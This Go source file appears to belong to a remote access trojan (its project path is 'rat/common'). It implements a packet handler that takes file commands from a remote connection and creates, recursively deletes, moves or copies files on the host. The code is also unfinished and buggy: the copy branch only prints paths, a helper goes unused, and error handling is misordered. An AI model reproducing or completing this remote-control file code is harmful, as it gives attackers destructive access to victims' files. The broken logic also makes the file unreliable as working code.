package main

import (
	"fmt"
	"io"
	"os"
	"path/filepath"
	"rat/common"
	"strings"
)

type FilePacket struct {
}

func copyfile(from, to string) error {
	src, err := os.Open(from)
	defer src.Close()
	if err != nil {
		return err
	}

	dest, err := os.Create(to)
	defer dest.Close()
	if err != nil {
		return err
	}

	io.Copy(dest, src)

	return nil
}

func (packet FilePacket) GetHeader() common.PacketHeader {
	return common.FileHeader
}

func (packet FilePacket) Write(c *Connection) error {
	return nil
}

func (packet FilePacket) Read(c *Connection) error {
	file, _ := c.ReadString()
	t, err := c.ReadInt()
	task := common.FileTask(t)

	switch task {
	case common.Touch:
		f, ferr := os.Create(file)
		if ferr != nil {
			f.Close()
		}
	case common.Unlink:
		os.RemoveAll(file)
	case common.Move:
		defer os.RemoveAll(file)
		fallthrough
	case common.Copy:
		dest, _ := c.ReadString()
		stat, _ := os.Stat(file)

		if stat.IsDir() {
			filepath.Walk(file, func(filepath string, fileInfo os.FileInfo, err error) error {
				newpath := strings.Replace(filepath, file, dest, -1)
				fmt.Println("Old:", filepath, "new:", newpath)
				return nil
			})
		} else {
			fmt.Println(filepath.Join(dest, filepath.Base(file)))
		}
	}

	return err
}
